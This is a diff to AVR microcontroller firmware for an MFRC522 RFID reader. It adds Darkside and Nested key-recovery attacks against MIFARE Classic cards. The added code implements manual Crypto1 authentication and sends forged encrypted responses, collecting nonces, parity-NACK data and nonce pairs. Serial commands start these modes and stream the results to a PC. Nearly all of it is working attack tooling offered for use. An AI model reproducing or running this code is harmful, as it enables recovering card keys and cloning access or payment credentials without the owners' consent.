@@ -1,15 +1,19 @@
 #include <avr/io.h>
 #include <avr/pgmspace.h>
 #include <util/delay.h>
+#include <string.h>
 #include "uart.h"
 #include "spi.h"
 #include "mfrc522.h"
+#include "crypto1.h"
 
 #define MODE_IDLE       0
 #define MODE_CONTINUOUS 1
 #define MODE_ONESHOT    2
 #define MODE_WRITE      3
 #define MODE_WRITE_BLK0 4
+#define MODE_DARKSIDE   5
+#define MODE_NESTED     6
 
 // Print chip type and cloneability based on SAK byte (human-readable)
 static void print_chip_info(uint8_t sak) {
@@ -128,6 +132,131 @@ static uint8_t reselect_card(uint8_t *uid) {
     if (mfrc522_select(PICC_ANTICOLL1, uid, &sak) != MI_OK)
         return MI_ERR;
     return MI_OK;
+}
+
+// Perform manual authentication capturing the plaintext nonce.
+// Uses PCD_Transceive (not PCD_MFAuthent) so we get the raw nonce.
+// Retries up to max_retries times to find a nonce where auto-parity works.
+// On success: nt_out contains the 4-byte plaintext nonce, crypto state is active.
+// Returns MI_OK on success, MI_ERR on failure.
+static uint8_t manual_auth(uint8_t block, uint8_t *key, uint8_t *uid,
+                           uint8_t *nt_out, crypto1_state *cs_out,
+                           uint16_t max_retries) {
+    uint8_t cmd[4];
+    uint8_t nt[4];
+    uint8_t response[8];
+    uint8_t at_buf[4];
+    uint8_t back_len;
+    uint8_t status;
+    uint8_t atqa[2];
+    uint8_t sak;
+
+    for (uint16_t retry = 0; retry < max_retries; retry++) {
+        // Ensure CRC is in default state for card selection
+        mfrc522_set_bit(TxModeReg, 0x80);
+        mfrc522_set_bit(RxModeReg, 0x80);
+
+        // Re-select card each attempt
+        if (mfrc522_request(PICC_REQALL, atqa) != MI_OK) continue;
+        if (mfrc522_anticoll(PICC_ANTICOLL1, uid) != MI_OK) continue;
+        if (mfrc522_select(PICC_ANTICOLL1, uid, &sak) != MI_OK) continue;
+
+        // Step 1: Send AUTH command, receive plaintext nonce
+        cmd[0] = PICC_AUTHKA;
+        cmd[1] = block;
+        mfrc522_calculate_crc(cmd, 2, &cmd[2]);
+
+        // Need CRC on TX, no CRC on RX for this step
+        mfrc522_set_bit(TxModeReg, 0x80);    // TxCRCEn = 1
+        mfrc522_clear_bit(RxModeReg, 0x80);  // RxCRCEn = 0
+        mfrc522_write_reg(BitFramingReg, 0x00);
+
+        status = mfrc522_to_card(PCD_Transceive, cmd, 4, nt, &back_len);
+        if (status != MI_OK || back_len != 32) {
+            mfrc522_halt();
+            continue;
+        }
+
+        // Step 2: Initialize crypto1
+        crypto1_state cs;
+        crypto1_init(&cs, key);
+
+        // Feed uid ^ nt into LFSR
+        uint32_t uid32 = ((uint32_t)uid[0]) | ((uint32_t)uid[1] << 8) |
+                         ((uint32_t)uid[2] << 16) | ((uint32_t)uid[3] << 24);
+        uint32_t nt32 = ((uint32_t)nt[0]) | ((uint32_t)nt[1] << 8) |
+                        ((uint32_t)nt[2] << 16) | ((uint32_t)nt[3] << 24);
+        crypto1_word(&cs, uid32 ^ nt32, 0);
+
+        // Step 3: Check if parity will work for 8-byte response
+        crypto1_state cs_check = cs;  // copy state
+        if (!parity_check_ok(&cs_check, 8)) {
+            mfrc522_halt();
+            continue;  // Parity won't match, try new nonce
+        }
+
+        // Step 4: Compute encrypted response
+        // nr = reader nonce (use retry counter as simple source)
+        uint32_t nr = retry | ((uint32_t)retry << 16);
+        uint32_t ar = prng_successor(nt32, 64);
+
+        // Encrypt nr
+        uint32_t ks_nr = crypto1_word(&cs, nr, 1);
+        uint32_t nr_enc = nr ^ ks_nr;
+
+        // Encrypt ar
+        uint32_t ks_ar = crypto1_word(&cs, ar, 1);
+        uint32_t ar_enc = ar ^ ks_ar;
+
+        // Pack into response buffer (LSB first byte order)
+        response[0] = nr_enc & 0xFF;
+        response[1] = (nr_enc >> 8) & 0xFF;
+        response[2] = (nr_enc >> 16) & 0xFF;
+        response[3] = (nr_enc >> 24) & 0xFF;
+        response[4] = ar_enc & 0xFF;
+        response[5] = (ar_enc >> 8) & 0xFF;
+        response[6] = (ar_enc >> 16) & 0xFF;
+        response[7] = (ar_enc >> 24) & 0xFF;
+
+        // Step 5: Send encrypted response, expect 4-byte at
+        // No CRC on TX or RX for this step
+        mfrc522_clear_bit(TxModeReg, 0x80);  // TxCRCEn = 0
+        mfrc522_clear_bit(RxModeReg, 0x80);  // RxCRCEn = 0
+
+        status = mfrc522_to_card(PCD_Transceive, response, 8, at_buf, &back_len);
+        if (status != MI_OK || back_len != 32) {
+            mfrc522_halt();
+            continue;
+        }
+
+        // Step 6: Verify at
+        uint32_t at_enc32 = ((uint32_t)at_buf[0]) | ((uint32_t)at_buf[1] << 8) |
+                            ((uint32_t)at_buf[2] << 16) | ((uint32_t)at_buf[3] << 24);
+        uint32_t ks_at = crypto1_word(&cs, 0, 0);
+        uint32_t at = at_enc32 ^ ks_at;
+        uint32_t expected_at = prng_successor(nt32, 96);
+
+        if (at != expected_at) {
+            mfrc522_halt();
+            continue;
+        }
+
+        // Auth successful!
+        memcpy(nt_out, nt, 4);
+        *cs_out = cs;
+
+        // Restore CRC settings for normal operation
+        mfrc522_set_bit(TxModeReg, 0x80);
+        mfrc522_set_bit(RxModeReg, 0x80);
+
+        return MI_OK;
+    }
+
+    // Restore CRC settings
+    mfrc522_set_bit(TxModeReg, 0x80);
+    mfrc522_set_bit(RxModeReg, 0x80);
+
+    return MI_ERR;
 }
 
 // Try authenticating a block with all known keys (Key A and Key B).
@@ -327,6 +456,10 @@ static uint8_t do_scan(void) {
 
 static uint8_t write_uid[5];
 static uint8_t write_authenticated_sector;
+static uint8_t dark_sector;
+static uint8_t nested_known_block;
+static uint8_t nested_target_block;
+static uint8_t nested_key[6];
 
 static uint8_t parse_hex_byte(const char *s) {
     uint8_t hi = hex_char_to_val(s[0]);
@@ -485,6 +618,157 @@ static void do_format(void) {
     uart_puts("OK:FORMAT_COMPLETE\r\n");
 }
 
+static void do_darkside_round(void) {
+    uint8_t status;
+    uint8_t atqa[2];
+    uint8_t uid[5];
+    uint8_t sak;
+    uint8_t nt[4];
+    uint8_t back_len;
+
+    // Select card
+    status = mfrc522_request(PICC_REQALL, atqa);
+    if (status != MI_OK) {
+        uart_puts("DARK:ERR:NO_TAG\r\n");
+        return;
+    }
+    status = mfrc522_anticoll(PICC_ANTICOLL1, uid);
+    if (status != MI_OK) {
+        uart_puts("DARK:ERR:ANTICOLL\r\n");
+        return;
+    }
+    status = mfrc522_select(PICC_ANTICOLL1, uid, &sak);
+    if (status != MI_OK) {
+        uart_puts("DARK:ERR:SELECT\r\n");
+        return;
+    }
+
+    // Send AUTH command to get plaintext nonce
+    uint8_t cmd[4];
+    cmd[0] = PICC_AUTHKA;
+    cmd[1] = dark_sector * 4;  // first block of sector
+    mfrc522_calculate_crc(cmd, 2, &cmd[2]);
+
+    mfrc522_set_bit(TxModeReg, 0x80);    // TX CRC on
+    mfrc522_clear_bit(RxModeReg, 0x80);  // RX CRC off
+
+    status = mfrc522_to_card(PCD_Transceive, cmd, 4, nt, &back_len);
+    if (status != MI_OK || back_len != 32) {
+        uart_puts("DARK:ERR:AUTH_CMD\r\n");
+        mfrc522_halt();
+        // Restore CRC
+        mfrc522_set_bit(TxModeReg, 0x80);
+        mfrc522_set_bit(RxModeReg, 0x80);
+        return;
+    }
+
+    // Send nonce to PC
+    uart_puts("DARK:NT:");
+    for (uint8_t i = 0; i < 4; i++) uart_put_hex(nt[i]);
+    uart_puts("\r\n");
+
+    // Send 8 random bytes as auth response
+    // Use a simple counter-based value for reproducibility
+    static uint16_t dark_counter = 0;
+    uint8_t fake_response[8];
+    for (uint8_t i = 0; i < 8; i++) {
+        fake_response[i] = (dark_counter >> (i & 1 ? 8 : 0)) + i;
+    }
+    dark_counter++;
+
+    mfrc522_clear_bit(TxModeReg, 0x80);  // TX CRC off
+    mfrc522_clear_bit(RxModeReg, 0x80);  // RX CRC off
+
+    uint8_t resp_buf[4];
+    status = mfrc522_to_card(PCD_Transceive, fake_response, 8, resp_buf, &back_len);
+
+    // Restore CRC settings
+    mfrc522_set_bit(TxModeReg, 0x80);
+    mfrc522_set_bit(RxModeReg, 0x80);
+
+    if (status == MI_OK && back_len == 4) {
+        // Got 4-bit NACK — parity matched!
+        uart_puts("DARK:NACK:");
+        // Send the nr,ar we used so PC can analyze
+        for (uint8_t i = 0; i < 8; i++) uart_put_hex(fake_response[i]);
+        uart_puts("\r\n");
+    } else {
+        uart_puts("DARK:TIMEOUT\r\n");
+    }
+
+    mfrc522_halt();
+}
+
+static void do_nested_collect(void) {
+    uint8_t uid[5];
+    uint8_t nt_known[4];
+    crypto1_state cs;
+
+    // Step 1: Manual auth to known sector
+    uint8_t status = manual_auth(nested_known_block, nested_key, uid,
+                                 nt_known, &cs, 500);
+    if (status != MI_OK) {
+        uart_puts("NESTED:FAIL:AUTH\r\n");
+        return;
+    }
+
+    // Step 2: Send encrypted AUTH for target sector
+    // The card is in encrypted mode (our software crypto tracks state)
+    // RC522 crypto is OFF, so we encrypt in software
+
+    uint8_t auth_cmd[4];
+    auth_cmd[0] = PICC_AUTHKA;
+    auth_cmd[1] = nested_target_block;
+
+    // Compute CRC on plaintext
+    // Note: CRC is computed on plaintext, then encrypted with the data
+    // Actually for MIFARE Classic re-auth, the CRC calculation is on the
+    // plaintext command, then everything (cmd + CRC) is encrypted
+    mfrc522_calculate_crc(auth_cmd, 2, &auth_cmd[2]);
+
+    // Check parity for 4 encrypted bytes
+    crypto1_state cs_par = cs;
+    if (!parity_check_ok(&cs_par, 4)) {
+        uart_puts("NESTED:FAIL:PARITY\r\n");
+        mfrc522_halt();
+        return;
+    }
+
+    // Encrypt the 4 bytes
+    uint8_t enc_cmd[4];
+    for (uint8_t i = 0; i < 4; i++) {
+        enc_cmd[i] = auth_cmd[i] ^ crypto1_byte(&cs, auth_cmd[i], 0);
+    }
+
+    // Send encrypted auth command, expect 4-byte plaintext nonce
+    // After receiving re-auth, card drops crypto and sends nt in plaintext
+    mfrc522_clear_bit(TxModeReg, 0x80);  // No CRC (already in encrypted data)
+    mfrc522_clear_bit(RxModeReg, 0x80);
+
+    uint8_t nt_target[4];
+    uint8_t back_len;
+    status = mfrc522_to_card(PCD_Transceive, enc_cmd, 4, nt_target, &back_len);
+
+    // Restore CRC settings
+    mfrc522_set_bit(TxModeReg, 0x80);
+    mfrc522_set_bit(RxModeReg, 0x80);
+
+    if (status != MI_OK || back_len != 32) {
+        uart_puts("NESTED:FAIL:TARGET\r\n");
+        mfrc522_halt();
+        return;
+    }
+
+    // Send nonce pair to PC
+    uart_puts("NESTED:NT:");
+    for (uint8_t i = 0; i < 4; i++) uart_put_hex(nt_known[i]);
+    uart_putc(':');
+    for (uint8_t i = 0; i < 4; i++) uart_put_hex(nt_target[i]);
+    uart_puts("\r\n");
+
+    mfrc522_halt();
+}
+
 int main(void) {
     uint8_t scan_mode = MODE_IDLE;
     char line_buf[48];
@@ -555,12 +839,94 @@ int main(void) {
                 case 'F':
                     do_format();
                     break;
+                case 'K':
+                    // Darkside attack — wait for sector number
+                    if (uart_available()) {
+                        char hi = uart_getc();
+                        char lo = uart_available() ? uart_getc() : '0';
+                        dark_sector = (hex_char_to_val(hi) << 4) | hex_char_to_val(lo);
+                    } else {
+                        dark_sector = 0;
+                    }
+                    scan_mode = MODE_DARKSIDE;
+                    uart_puts("OK:DARKSIDE_START\r\n");
+
+                    // Send UID
+                    {
+                        uint8_t atqa[2], uid[5], sak;
+                        if (mfrc522_request(PICC_REQALL, atqa) == MI_OK &&
+                            mfrc522_anticoll(PICC_ANTICOLL1, uid) == MI_OK &&
+                            mfrc522_select(PICC_ANTICOLL1, uid, &sak) == MI_OK) {
+                            uart_puts("DARK:UID:");
+                            for (uint8_t i = 0; i < 4; i++) uart_put_hex(uid[i]);
+                            uart_puts("\r\n");
+                            mfrc522_halt();
+                        }
+                    }
+                    break;
+                case 'N':
+                    // Parse: N<known_blk_2hex><target_blk_2hex><key_12hex>
+                    // Total: 1 + 2 + 2 + 12 = 17 chars
+                    scan_mode = MODE_NESTED;
+                    // Read remaining bytes (block until we have them or timeout)
+                    {
+                        uint8_t nbuf[16];
+                        uint8_t ni = 0;
+                        while (ni < 16) {
+                            if (uart_available()) {
+                                nbuf[ni++] = uart_getc();
+                            }
+                        }
+                        nested_known_block = parse_hex_byte((char*)&nbuf[0]);
+                        nested_target_block = parse_hex_byte((char*)&nbuf[2]);
+                        for (uint8_t i = 0; i < 6; i++) {
+                            nested_key[i] = parse_hex_byte((char*)&nbuf[4 + i*2]);
+                        }
+                    }
+                    uart_puts("OK:NESTED_START\r\n");
+                    break;
                 }
             }
         }
 
         if (scan_mode == MODE_WRITE || scan_mode == MODE_WRITE_BLK0) {
             continue;  // No delay - must read UART fast to avoid RX overflow
+        }
+
+        if (scan_mode == MODE_DARKSIDE) {
+            if (uart_available()) {
+                char c = uart_getc();
+                if (c == 'X' || c == 'P') {
+                    scan_mode = MODE_IDLE;
+                    uart_puts("DARK:DONE\r\n");
+                    continue;
+                }
+            }
+            do_darkside_round();
+            _delay_ms(5);  // brief pause between rounds
+            continue;
+        }
+
+        if (scan_mode == MODE_NESTED) {
+            static uint8_t nested_rounds = 0;
+            if (uart_available()) {
+                char c = uart_getc();
+                if (c == 'X' || c == 'P') {
+                    scan_mode = MODE_IDLE;
+                    nested_rounds = 0;
+                    uart_puts("NESTED:DONE\r\n");
+                    continue;
+                }
+            }
+            do_nested_collect();
+            nested_rounds++;
+            if (nested_rounds >= 5) {
+                uart_puts("NESTED:DONE\r\n");
+                scan_mode = MODE_IDLE;
+                nested_rounds = 0;
+            }
+            _delay_ms(10);
+            continue;
         }
 
         if (scan_mode == MODE_IDLE) {
